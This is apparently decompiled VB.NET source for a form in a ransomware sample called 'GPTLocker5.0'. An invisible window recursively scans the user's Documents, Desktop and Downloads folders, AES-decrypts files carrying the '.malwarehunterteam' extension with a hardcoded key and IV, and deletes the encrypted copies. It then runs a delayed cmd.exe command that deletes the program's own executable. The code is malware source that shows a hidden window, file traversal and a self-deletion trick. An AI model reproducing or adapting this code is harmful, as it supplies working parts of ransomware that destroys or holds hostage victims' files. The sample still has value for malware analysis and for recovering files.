Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace GPTLocker5._0
	' Token: 0x0200000D RID: 13
	<DesignerGenerated()>
	Public Partial Class Form2
		Inherits Form

		' Token: 0x06000035 RID: 53 RVA: 0x000025A7 File Offset: 0x000007A7
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Form2_Load
			Me.method_0()
		End Sub

		' Token: 0x06000037 RID: 55 RVA: 0x00002DE0 File Offset: 0x00000FE0
		Private Sub method_0()
			MyBase.SuspendLayout()
			MyBase.AutoScaleDimensions = New SizeF(6F, 13F)
			MyBase.AutoScaleMode = AutoScaleMode.Font
			MyBase.ClientSize = New Size(270, 153)
			MyBase.ControlBox = False
			MyBase.FormBorderStyle = FormBorderStyle.None
			MyBase.MaximizeBox = False
			MyBase.MinimizeBox = False
			MyBase.Name = "Form2"
			MyBase.Opacity = 0.0
			MyBase.ShowIcon = False
			MyBase.ShowInTaskbar = False
			Me.Text = " "
			MyBase.ResumeLayout(False)
		End Sub

		' Token: 0x1700000E RID: 14
		' (get) Token: 0x06000038 RID: 56 RVA: 0x00002568 File Offset: 0x00000768
		Protected Overrides ReadOnly Property ShowWithoutActivation As Boolean
			Get
				Return True
			End Get
		End Property

		' Token: 0x06000039 RID: 57 RVA: 0x00002E7C File Offset: 0x0000107C
		Private Sub Form2_Load(sender As Object, e As EventArgs)
			Try
				Me.method_1(Environment.GetFolderPath(Environment.SpecialFolder.Personal))
			Catch ex As Exception
			End Try
			Try
				Me.method_1(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
			Catch ex2 As Exception
			End Try
			Try
				Me.method_1(Environment.GetEnvironmentVariable("UserProfile") + "\Downloads")
			Catch ex3 As Exception
			End Try
			Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 5 & Del " + Application.ExecutablePath)
			Application.[Exit]()
			Class2.Class3_0.Middleman.Close()
			Class2.Class3_0.Form1.Close()
			MyBase.Close()
		End Sub

		' Token: 0x0600003A RID: 58 RVA: 0x00002F60 File Offset: 0x00001160
		Private Sub method_1(string_1 As String)
			For Each string_2 As String In Directory.GetFiles(string_1)
				If Me.method_2(string_2) Then
					Me.method_3(string_2)
				End If
			Next
			For Each string_3 As String In Directory.GetDirectories(string_1)
				Me.method_1(string_3)
			Next
		End Sub

		' Token: 0x0600003B RID: 59 RVA: 0x000025C8 File Offset: 0x000007C8
		Private Function method_2(string_1 As String) As Boolean
			Return string_1.EndsWith(Form2.string_0)
		End Function

		' Token: 0x0600003C RID: 60 RVA: 0x00002FC0 File Offset: 0x000011C0
		Private Sub method_3(string_1 As String)
			Try
				' The following expression was wrapped in a checked-expression
				Dim path As String = string_1.Substring(0, string_1.Length - Form2.string_0.Length)
				Using aes As Aes = Aes.Create()
					aes.Key = Form2.byte_0
					aes.IV = Form2.byte_1
					Using fileStream As FileStream = New FileStream(string_1, FileMode.Open)
						Using fileStream2 As FileStream = New FileStream(path, FileMode.Create)
							Using cryptoTransform As ICryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV)
								Using cryptoStream As CryptoStream = New CryptoStream(fileStream, cryptoTransform, CryptoStreamMode.Read)
									cryptoStream.CopyTo(fileStream2)
								End Using
							End Using
						End Using
					End Using
				End Using
				File.Delete(string_1)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000015 RID: 21
		Private Shared byte_0 As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }

		' Token: 0x04000016 RID: 22
		Private Shared byte_1 As Byte() = New Byte() { 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }

		' Token: 0x04000017 RID: 23
		Private Shared string_0 As String = ".malwarehunterteam"
	End Class
End Namespace
